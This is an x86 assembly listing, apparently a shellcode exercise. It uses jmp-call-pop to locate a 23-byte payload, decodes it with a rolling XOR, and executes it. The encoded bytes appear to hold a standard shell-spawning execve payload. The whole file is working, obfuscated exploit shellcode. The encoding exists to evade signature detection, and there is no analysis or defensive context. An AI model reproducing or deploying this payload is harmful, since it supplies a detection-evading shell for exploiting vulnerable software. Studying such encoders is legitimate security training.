global _start

section .text

_start
	jmp short call_decoder

decoder:
	xor eax, eax
	mov ecx, eax
	mov edx, eax
	pop esi		; Store Shellcode address
	mov cl, 23	; Length of shellcod
	mov al, 0x90	; First 0x90 xor seed

decode:
	mov dl, [esi]	; Move byte at esi (Shellcode) to edx
	xor al, dl		; al = al ^ dl
	mov [esi], al	; mov al to [esi]
	mov al, dl		; save dl for next xor. Rolling xor
	inc esi			; esi++
	loop decode 	; Loop 23 times with cx

	jmp short Shellcode 	; Store shellcode decoded		

call_decoder:
	call decoder
	Shellcode: db 0xa1, 0x61, 0x31, 0x59, 0x76, 0x59, 0x2a, 0x42, 0x2a, 0x5, 0x67, 0xe, 0x60, 0xe9, 0xa, 0x83, 0x41, 0xc8, 0x9, 0xb9, 0xb2, 0x7f, 0xff